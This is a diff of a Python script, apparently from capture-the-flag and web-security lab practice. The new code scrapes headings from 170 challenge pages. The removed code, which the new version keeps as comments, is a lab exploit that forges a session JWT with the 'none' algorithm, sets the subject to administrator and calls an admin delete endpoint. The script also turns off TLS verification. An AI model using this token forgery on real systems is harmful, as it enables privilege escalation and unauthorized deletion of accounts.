@@ -9,49 +9,51 @@ import jwt
 import base64
 
 
-session = requests.Session()
-url = 'https://0a4b00b604f9701d8568f8fe00e60012.web-security-academy.net'
+url = "https://digitaldragonsctf-everything-at-once.chals.io/"
+data_all = ""
+# response = requests.get( url  + str(1) + ".html", verify=False)
+# print(response.text)
+for i in range(170):
+    response = requests.get(url  + str(i) + ".html", verify=False)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    data = soup.find('h1').text
+    data_all += data
+print(data_all)
+# data = {
+#     'csrf': csrf,
+#     'username': 'wiener',
+#     'password': 'peter',
+# }
 
-response = session.get(url + '/login')
+# response = session.post(
+#     url + '/login',
+#     data=data,
+#     verify=False,
+#     allow_redirects=False,
+# )
 
-soup = BeautifulSoup(response.text, 'html.parser')
-csrf = soup.find('input', {'name': 'csrf'})['value']
+# token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]
 
-data = {
-    'csrf': csrf,
-    'username': 'wiener',
-    'password': 'peter',
-}
+# decode_token = jwt.decode(token, options={"verify_signature":False})
+# print(f"Decode token: {decode_token}\n")
 
-response = session.post(
-    url + '/login',
-    data=data,
-    verify=False,
-    allow_redirects=False,
-)
+# decode_token['sub'] = 'administrator'
+# print(f"Modified payload : {decode_token}\n")
 
-token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]
+# modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
+# print(f"Modified token : {modified_token}\n")
 
-decode_token = jwt.decode(token, options={"verify_signature":False})
-print(f"Decode token: {decode_token}\n")
+# session_data = modified_token
+# cookies = {
+#     'session' : session_data,
 
-decode_token['sub'] = 'administrator'
-print(f"Modified payload : {decode_token}\n")
+# }
 
-modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
-print(f"Modified token : {modified_token}\n")
+# response = requests.get(
+#     url + '/admin/delete?username=carlos',
+#     cookies=cookies,
+#     verify=False,
+# )
 
-session_data = modified_token
-cookies = {
-    'session' : session_data,
-
-}
-
-response = requests.get(
-    url + '/admin/delete?username=carlos',
-    cookies=cookies,
-    verify=False,
-)
-
-soup = BeautifulSoup(response.text,'html.parser')
-print(soup)
+# soup = BeautifulSoup(response.text,'html.parser')
+# print(soup)
